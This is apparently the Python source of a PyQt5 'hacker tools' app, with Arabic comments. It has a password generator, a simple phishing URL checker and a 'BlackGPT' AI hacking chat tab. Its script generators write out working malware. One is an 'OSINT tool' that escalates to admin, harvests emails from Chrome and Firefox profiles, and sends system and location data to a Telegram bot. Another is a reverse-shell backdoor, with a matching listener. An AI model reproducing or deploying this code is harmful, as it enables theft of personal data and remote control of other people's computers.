import sys
import os
import random
import string
import socket
import requests
import webbrowser
from urllib.parse import urlparse
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTabWidget, QWidget, 
                            QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
                            QPushButton, QTextEdit, QCheckBox, QSpinBox,
                            QFileDialog)
from PyQt5.QtCore import Qt
import Pycodz.ai as z44o

class HackerToolApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Advanced Hacker Tools v2.2")
        self.setGeometry(100, 100, 900, 700)
        
        # التنسيقات الرسومية
        self.setup_styles()
        
        # تهيئة BlackGPT
        self.chat_initialized = False
        self.initialize_blackgpt()
        
        # إنشاء واجهة المستخدم
        self.setup_ui()

    def setup_styles(self):
        self.setStyleSheet("""
            QMainWindow { background-color: black; color: lime; }
            QTabWidget::pane { background-color: black; border: 1px solid lime; }
            QTabBar::tab { 
                background-color: #1a1a1a; 
                color: lime; 
                padding: 10px; 
                border: 1px solid lime; 
            }
            QTabBar::tab:selected { background-color: #2a2a2a; }
            QTextEdit, QLineEdit { background-color: black; color: lime; border: 1px solid lime; }
            QPushButton { 
                background-color: #2a2a2a; color: lime; border: 1px solid lime; padding: 8px;
            }
            QPushButton:hover { background-color: #3a3a3a; }
            QCheckBox, QSpinBox, QLabel { color: lime; }
        """)

    def initialize_blackgpt(self):
        try:
            self.bot = z44o.PHIND()
            self.chat_initialized = True
        except Exception as e:
            print(f"Error initializing BlackGPT: {e}")

    def setup_ui(self):
        self.tab_widget = QTabWidget()
        self.setCentralWidget(self.tab_widget)
        
        # إضافة جميع التبويبات
        self.setup_password_tab()
        self.setup_urlscan_tab()
        self.setup_osint_tab()
        self.setup_scriptgen_tab()
        self.setup_blackgpt_tab()
        self.setup_devinfo_tab()
        self.setup_help_tab()

    # ------ تبويب إنشاء الباسوردات ------
    def setup_password_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()
        
        # إعدادات طول الباسورد
        length_layout = QHBoxLayout()
        length_label = QLabel("Password Length:")
        self.length_spin = QSpinBox()
        self.length_spin.setRange(8, 64)
        self.length_spin.setValue(16)
        length_layout.addWidget(length_label)
        length_layout.addWidget(self.length_spin)
        
        # خيارات الأحرف
        options_layout = QHBoxLayout()
        self.upper_check = QCheckBox("Uppercase")
        self.lower_check = QCheckBox("Lowercase")
        self.numbers_check = QCheckBox("Numbers")
        self.symbols_check = QCheckBox("Symbols")
        for cb in [self.upper_check, self.lower_check, self.numbers_check, self.symbols_check]:
            cb.setChecked(True)
            options_layout.addWidget(cb)
        
        # عناصر التحكم
        gen_btn = QPushButton("Generate Password")
        gen_btn.clicked.connect(self.generate_password)
        self.pass_display = QTextEdit()
        self.pass_display.setReadOnly(True)
        copy_btn = QPushButton("Copy Password")
        copy_btn.clicked.connect(self.copy_password)
        
        # تجميع العناصر
        layout.addLayout(length_layout)
        layout.addLayout(options_layout)
        layout.addWidget(gen_btn)
        layout.addWidget(self.pass_display)
        layout.addWidget(copy_btn)
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "🔑 Password Gen")

    def generate_password(self):
        length = self.length_spin.value()
        chars = ''
        if self.upper_check.isChecked(): chars += string.ascii_uppercase
        if self.lower_check.isChecked(): chars += string.ascii_lowercase
        if self.numbers_check.isChecked(): chars += string.digits
        if self.symbols_check.isChecked(): chars += string.punctuation
        
        if chars:
            password = ''.join(random.choice(chars) for _ in range(length))
            self.pass_display.setPlainText(password)
        else:
            self.pass_display.setPlainText("Select at least one option!")

    def copy_password(self):
        password = self.pass_display.toPlainText()
        if password and "Select" not in password:
            QApplication.clipboard().setText(password)
            self.show_status("Password copied!")

    # ------ تبويب فحص المواقع ------
    def setup_urlscan_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()
        
        url_layout = QHBoxLayout()
        url_label = QLabel("Enter URL:")
        self.url_input = QLineEdit()
        scan_btn = QPushButton("Scan URL")
        scan_btn.clicked.connect(self.scan_url)
        
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_input)
        layout.addLayout(url_layout)
        layout.addWidget(scan_btn)
        
        self.scan_result = QTextEdit()
        self.scan_result.setReadOnly(True)
        layout.addWidget(self.scan_result)
        
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "🔍 URL Scanner")

    def scan_url(self):
        url = self.url_input.text()
        self.scan_result.clear()
        
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                raise ValueError("Invalid URL")
            
            # التحقق من المؤشرات
            suspicious = ['login', 'secure', 'account', 'banking', 'verify']
            is_phish = any(p in url.lower() for p in suspicious)
            
            # معلومات أساسية
            self.scan_result.append(f"Domain: {parsed.netloc}")
            try:
                ip = socket.gethostbyname(parsed.netloc)
                self.scan_result.append(f"IP: {ip}")
            except:
                self.scan_result.append("IP resolution failed")
            
            # النتيجة النهائية
            if is_phish:
                self.scan_result.setStyleSheet("color: red;")
                self.scan_result.append("\n⚠️ High phishing risk!")
            else:
                self.scan_result.setStyleSheet("color: lime;")
                self.scan_result.append("\n✅ Appears safe")
                
        except Exception as e:
            self.scan_result.append(f"Error: {str(e)}")

       # ------ تبويب OSINT ------
    def setup_osint_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()
        
        btn1 = QPushButton("Generate OSINT Tool")
        btn1.clicked.connect(lambda: self.create_script_file('osint_tool.py', """
import platform
import requests
import os
import getpass
import json
import psutil
import sqlite3
import sys
import ctypes
import time
import datetime
import socket

# إعدادات البوت
BOT_TOKEN = "7906820716:AA"
CHAT_ID = "6252"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# تشغيل البرنامج كمسؤول (Windows فقط)
def run_as_admin():
    if os.name == "nt":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                sys.exit(0)
        except:
            pass

# جمع معلومات النظام
def get_system_info():
    system_info = {
        "🕒 التاريخ والوقت": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "👤 المستخدم": getpass.getuser(),
        "💻 اسم الجهاز": platform.node(),
        "🖥️ النظام": f"{platform.system()} {platform.release()} ({platform.version()})",
        "🔧 المعالج": platform.processor(),
        "🖥️ الهندسة المعمارية": " - ".join(platform.architecture()),
        "🔋 حالة البطارية": get_battery_status(),
        "🔌 عنوان IP الخارجي": get_external_ip(),
        "🔗 عنوان IP المحلي": get_local_ip(),
        "📍 الموقع": get_location(),
        "👥 الحسابات": get_users(),
        "📧 الإيميلات المسجلة": get_saved_emails(),
    }
    return system_info

# الحصول على عنوان IP المحلي
def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "غير متوفر"

# الحصول على عنوان IP الخارجي
def get_external_ip():
    try:
        return requests.get("https://api64.ipify.org?format=json").json().get("ip", "غير متوفر")
    except:
        return "غير متوفر"

# الحصول على الموقع بناءً على الـ IP الخارجي
def get_location():
    try:
        ip = get_external_ip()
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        location = f"{data.get('city', 'غير معروف')}, {data.get('region', 'غير معروف')}, {data.get('country', 'غير معروف')}"
        return location
    except:
        return "غير متوفر"

# الحصول على الحسابات المسجلة في الجهاز
def get_users():
    try:
        users = [user.name for user in psutil.users()]
        return ", ".join(users) if users else "غير متوفر"
    except:
        return "غير متوفر"

# استخراج الإيميلات المحفوظة من المتصفحات (Chrome, Firefox)
def get_saved_emails():
    emails = set()

    # استخراج الإيميلات من Google Chrome
    chrome_path = os.path.expanduser("~") + r"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data"
    if os.path.exists(chrome_path):
        try:
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT email FROM autofill")
            for row in cursor.fetchall():
                if row[0]:
                    emails.add(row[0])
            conn.close()
        except:
            pass

    # استخراج الإيميلات من Firefox
    firefox_path = os.path.expanduser("~") + r"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    if os.path.exists(firefox_path):
        for profile in os.listdir(firefox_path):
            logins_json = os.path.join(firefox_path, profile, "logins.json")
            if os.path.exists(logins_json):
                try:
                    with open(logins_json, "r", encoding="utf-8") as file:
                        data = json.load(file)
                        for login in data.get("logins", []):
                            emails.add(login["username"])
                except:
                    pass

    return ", ".join(emails) if emails else "لا يوجد إيميلات محفوظة"

# الحصول على حالة البطارية
def get_battery_status():
    try:
        battery = psutil.sensors_battery()
        if battery:
            percent = battery.percent
            plugged = "⚡ مشحون" if battery.power_plugged else "🔋 يعمل على البطارية"
            return f"{percent}% - {plugged}"
        return "غير متوفر"
    except:
        return "غير متوفر"

# إرسال البيانات إلى بوت Telegram
def send_to_telegram(info):
    message = "\\n".join([f"{key}: {value}" for key, value in info.items()])
    params = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    response = requests.get(TELEGRAM_API_URL, params=params)
    return response.status_code

# إغلاق البرنامج بعد الإرسال
def close_program():
    if platform.system() == "Windows":
        ctypes.windll.user32.PostQuitMessage(0)
    else:
        sys.exit(0)

# تشغيل البرنامج
if __name__ == "__main__":
    run_as_admin()
    info = get_system_info()
    send_to_telegram(info)
    close_program()
"""))
        
        btn2 = QPushButton("Open OSINT Framework")
        btn2.clicked.connect(lambda: webbrowser.open("https://osintframework.com"))
        
        layout.addWidget(btn1)
        layout.addWidget(btn2)
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "🔎 OSINT Tools")
    # ------ تبويب إنشاء السكربتات ------
    def setup_scriptgen_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()
        
        scripts = [
            ("Backdoor", self.generate_backdoor),
            ("Listener", self.generate_listener),
            ("Chat Server", self.generate_chat_server),
            ("Chat Client", self.generate_chat_client)
        ]
        
        for name, func in scripts:
            btn = QPushButton(name)
            btn.clicked.connect(func)
            layout.addWidget(btn)
        
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "📜 Script Gen")

    def generate_backdoor(self):
        script = """import socket
import os

# إنشاء اتصال مع السيرفر
con = socket.socket()
con.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
con.connect(('192.168', 3))
con.send((os.getcwd() + "> ").encode())

while True:
    # استقبال الأوامر من السيرفر
    commands = con.recv(1024).decode()
    
    # تنفيذ الأوامر
    if commands.startswith('cd'):  # التعامل مع أمر تغيير الدليل
        os.chdir(commands[3:].strip())
        con.send((os.getcwd() + "> ").encode())
    else:  # تنفيذ باقي الأوامر
        cmd = os.popen(commands).read()
        con.send((cmd + "[commands]-shell >").encode())
"""
        self.create_script_file("backdoor.py", script)

    def generate_listener(self):
        script = """import socket
import threading

def handle_client(client_socket, client_address):
    print(f"[+] Connection established from {client_address[0]}:{client_address[1]}")
    try:
        while True:
            command = input("Enter command: ")
            if command.strip().lower() == "exit":
                client_socket.send(command.encode())
                client_socket.close()
                print("[-] Connection closed.")
                break
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response, end="")
    except Exception as e:
        print(f"[-] Error: {e}")
        client_socket.close()

def start_server(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((ip, port))
    server.listen(5)
    print(f"[+] Listening on {ip}:{port}...")
    
    while True:
        client_socket, client_address = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

if __name__ == "__main__":
    SERVER_IP = "192.168"  # الاستماع على جميع الواجهات
    SERVER_PORT = 33
    start_server(SERVER_IP, SERVER_PORT)
"""
        self.create_script_file("listener.py", script)

    def generate_chat_server(self):
        script = """import socket
import threading
import tkinter as tk
from tkinter import messagebox

# إعدادات السيرفر الافتراضية
default_host = '127.0.0.1'
default_port = 5000

# المتغيرات العالمية للاتصال
server_socket = None
conn = None
connected = False

def start_server():
    global server_socket, conn, connected
    host = host_entry.get()
    port = int(port_entry.get())
    
    # إنشاء سوكيت السيرفر
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    
    try:
        connection_status.config(text="Waiting for connection...", fg="green")
        conn, addr = server_socket.accept()  # الانتظار حتى يتصل العميل
        connected = True
        connection_status.config(text="Connected from: " + str(addr), fg="green")
        messagebox.showinfo("Connection", "Connected successfully")
        
        # بدء استلام الرسائل من العميل
        threading.Thread(target=receive_messages, daemon=True).start()
    except Exception as e:
        messagebox.showerror("Error", f"Failed to start server: {e}")

def receive_messages():
    global conn
    while True:
        try:
            data = conn.recv(1024).decode()
            if data:
                show_response(data)
        except:
            break

def show_response(msg):
    chat_box.config(state=tk.NORMAL)
    chat_box.insert(tk.END, f"Client: {msg}\n")
    chat_box.config(state=tk.DISABLED)

def send_message():
    if conn:
        msg = message_entry.get()
        send_message_to_client(msg)
        chat_box.config(state=tk.NORMAL)
        chat_box.insert(tk.END, f"Client: {msg}\n")

        chat_box.config(state=tk.DISABLED)
        message_entry.delete(0, tk.END)
    else:
        messagebox.showerror("Error", "Not connected to any client")

def send_message_to_client(msg):
    conn.send(msg.encode())

def refresh_connection():
    global conn, connected
    if conn:
        conn.close()
    connected = False
    connection_status.config(text="Connection refreshed", fg="green")

# إعداد واجهة tkinter
root = tk.Tk()
root.title("Control Panel")
root.geometry("400x600")
root.configure(bg="black")

# إدخال الـ IP
host_label = tk.Label(root, text="Host/IP:", bg="black", fg="green")
host_label.pack()
host_entry = tk.Entry(root)
host_entry.insert(0, default_host)
host_entry.pack()

# إدخال الـ Port
port_label = tk.Label(root, text="Port:", bg="black", fg="green")
port_label.pack()
port_entry = tk.Entry(root)
port_entry.insert(0, str(default_port))
port_entry.pack()

# زر بدء الاستماع
start_button = tk.Button(root, text="Start Listening", command=start_server, bg="green", fg="black")
start_button.pack(pady=5)

# حالة الاتصال
connection_status = tk.Label(root, text="Not connected yet", bg="black", fg="green")
connection_status.pack(pady=10)

# واجهة الشات
chat_box = tk.Text(root, height=15, width=50, state=tk.DISABLED, bg="black", fg="green")
chat_box.pack(pady=10)

# حقل إدخال الرسالة
message_label = tk.Label(root, text="Enter message to send:", bg="black", fg="green")
message_label.pack()
message_entry = tk.Entry(root, width=40)
message_entry.pack(pady=5)

# زر إرسال رسالة
send_button = tk.Button(root, text="Send Message", command=send_message, bg="blue", fg="white")
send_button.pack(pady=5)

# زر التحديث
refresh_button = tk.Button(root, text="Refresh Connection", command=refresh_connection, bg="yellow", fg="black")
refresh_button.pack(pady=5)

# تشغيل واجهة tkinter
root.mainloop()
"""
        self.create_script_file("chat_server.py", script)

    def generate_chat_client(self):
        script = """import socket
import threading
import tkinter as tk
from tkinter import messagebox
import webbrowser

# إعدادات السيرفر
host = '127.0.0.1'
port = 5000

# إنشاء سوكيت العميل
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# دالة لإجراء الاتصال عند الضغط على زر الاتصال
def connect_to_server():
    try:
        client_socket.connect((host, port))
        status_label.config(text="Connected to Server", fg="green")
        threading.Thread(target=receive_messages, daemon=True).start()
    except Exception as e:
        status_label.config(text="No Response from Server", fg="red")
        print(f"Error: {e}")

# دالة لاستقبال الرسائل من السيرفر
def receive_messages():
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if data:
                handle_message(data)
        except:
            break

def handle_message(msg):
    if msg.startswith("open_url:"):
        url = msg.split(":", 1)[1]
        webbrowser.open(url)  # فتح الرابط في المتصفح
    else:
        display_message(msg)

def display_message(msg):
    chat_box.config(state=tk.NORMAL)
    chat_box.insert(tk.END, f"Server: {msg}\n")
    chat_box.config(state=tk.DISABLED)

def send_message():
    msg = message_entry.get()
    if msg:
        client_socket.send(msg.encode())
        chat_box.config(state=tk.NORMAL)
        chat_box.insert(tk.END, f"You: {msg}\n")
        chat_box.config(state=tk.DISABLED)
        message_entry.delete(0, tk.END)

# واجهة الشات
root = tk.Tk()
root.title("Chat Client")
root.geometry("400x600")
root.configure(bg="black")

# حالة الاتصال
status_label = tk.Label(root, text="No Response from Server", bg="black", fg="red")
status_label.pack(pady=10)

# واجهة الشات
chat_box = tk.Text(root, height=15, width=50, state=tk.DISABLED, bg="black", fg="green")
chat_box.pack(pady=10)

# حقل إدخال الرسالة
message_label = tk.Label(root, text="Enter message to send:", bg="black", fg="green")
message_label.pack()
message_entry = tk.Entry(root, width=40)
message_entry.pack(pady=5)

# زر إرسال رسالة
send_button = tk.Button(root, text="Send Message", command=send_message, bg="blue", fg="white")
send_button.pack(pady=5)

# زر الاتصال
connect_button = tk.Button(root, text="Connect", command=connect_to_server, bg="green", fg="white")
connect_button.pack(pady=10)

root.mainloop()"""
        self.create_script_file("chat_client.py", script)

    # ------ تبويب BlackGPT ------
    def setup_blackgpt_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()
        
        status = QLabel("Status: " + ("Connected" if self.chat_initialized else "Not Connected"))
        self.chat_display = QTextEdit()
        self.chat_display.setReadOnly(True)
        self.chat_input = QLineEdit()
        send_btn = QPushButton("Send")
        send_btn.clicked.connect(self.send_chat)
        
        layout.addWidget(status)
        layout.addWidget(self.chat_display)
        layout.addWidget(self.chat_input)
        layout.addWidget(send_btn)
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "💬 BlackGPT")

    def send_chat(self):
        msg = self.chat_input.text()
        if not msg: return
        
        self.chat_display.append(f"You: {msg}")
        self.chat_input.clear()
        
        if not self.chat_initialized:
            self.chat_display.append("System: BlackGPT not initialized!")
            return
            
        try:
            response = self.bot.chat(msg)
            self.chat_display.append(f"AI: {response}")
        except Exception as e:
            self.chat_display.append(f"Error: {str(e)}")

    # ------ تبويب معلومات المطور ------
    def setup_devinfo_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()
        
        info = QTextEdit()
        info.setPlainText("""Developer: mr pin
Version: 2.2
Telegram: @Gg223q
Channel: @jeejcom""")
        info.setReadOnly(True)
        
        tg_btn = QPushButton("Open Telegram")
        tg_btn.clicked.connect(lambda: webbrowser.open("https://t.me/jeejcom"))
        
        layout.addWidget(info)
        layout.addWidget(tg_btn)
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "👨💻 Developer")

    # ------ تبويب المساعدة ------
    def setup_help_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()
        
        help_text = QTextEdit()
        help_text.setPlainText("""1. Password Generator - Generate strong passwords
2. URL Scanner - Check website safety
3. OSINT Tools - Generate tools and access resources
4. Script Gen - Create hacking scripts
5. BlackGPT - AI hacking assistant""")
        help_text.setReadOnly(True)
        
        layout.addWidget(help_text)
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "❓ Help")

    # ------ وظائف مساعدة ------
    def create_script_file(self, filename, content):
        try:
            path, _ = QFileDialog.getSaveFileName(self, "Save Script", filename, "Python Files (*.py)")
            if path:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(content)
                self.show_status(f"Saved: {os.path.basename(path)}")
        except Exception as e:
            self.show_status(f"Error: {str(e)}")

    def show_status(self, msg, duration=5000):
        self.statusBar().showMessage(msg, duration)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = HackerToolApp()
    window.show()
    sys.exit(app.exec_())